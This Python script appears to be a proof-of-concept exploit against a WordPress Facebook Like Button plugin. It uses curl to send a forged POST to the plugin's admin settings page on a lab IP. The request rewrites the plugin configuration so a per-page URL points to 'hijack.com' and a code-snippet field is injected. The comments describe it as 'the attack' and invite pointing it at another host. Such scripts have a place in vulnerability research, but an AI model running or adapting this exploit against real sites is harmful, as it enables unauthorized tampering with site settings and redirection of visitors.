import subprocess
import webbrowser

new = 2
url="https://10.211.55.7/"
webbrowser.open(url,new=new)

# Change the localhost to the personal locahost to test the attack

localhost = "https://10.211.55.7/"
attackurl = "https://hijack.com"
page = "facebook-like-button"
#url = "10.211.55.7/wp-admin/admin.php?page=facebook-like-button&edit=1"

#display homepage
displayHomepage = "1"

#display all pages
displayAllPages = "2"

#display all posts
displayAllPosts = "4"

#display all archieve pages
displayAllArchievePages = "16"

#displayExcludeSpecificPagesAndPosts
displayExcludeSpecificPagesAndPosts = "8"

#enable like button for mobile 0  for NO, 1 for YES
mobileLikeButton = "1"

appID = ""
adminID = ""
kidDirectedSite = "0"
image = ""
codeSnipped = "< =php+echo+fb_like_button();+?>"
before = "before"
url = "url"
#language settings
language = "en_US"
width = "65"

#position: left, center, right
position = "left"

#layout: standard, box_count, button_count, button
layout = "boncount"

#action: like, reccomend
action = "like"

#color: light, dark
color = "light"

#size: small, large
size = "large"

#share friends faces: 0  for NO, 1 for YES
friendsFaces = "1"

#include share button: 0  for NO, 1 for YES
shareButton = "1"

#the attack is performing

subprocess.call([
	"curl",
 	"-k",
	"--raw",
	"-d",
	"page=" + page +
	"&site_url="
	+ localhost +
	"&display[]=" + displayHomepage + 
	"&display[]=" + displayAllPages + 
	"&display[]=" + displayAllPosts +
	"&display[]=" + displayAllArchievePages +
	"&display[]=" + displayExcludeSpecificPagesAndPosts +
        "&mobile=" + mobileLikeButton + 
	"&fb_app_id=" + appID + 
	"&fb_app_admin=" + adminID + 
	"&kd=" + kidDirectedSite +
	"&fblb_default_upload_image=" + image + 
	"&code_snippet=" + codeSnipped + 
	"&beforeafter=" + before + 
	"&eachpage=" + url + 
	"&each_page_url=" + attackurl + 
	"&language=" + language + 
	"&width=" + width +
	"&position=" + position + 
	"&layout=" + layout + 
	"&action=" + action +
	"&color=" + color +
	"&btn_size=" + size + 
	"&faces=" + friendsFaces + 
	"&share=" + shareButton +
	"&update_fblb=",
 	 localhost + "/wp-admin/admin.php?page=facebook-like-button&edit=1"])





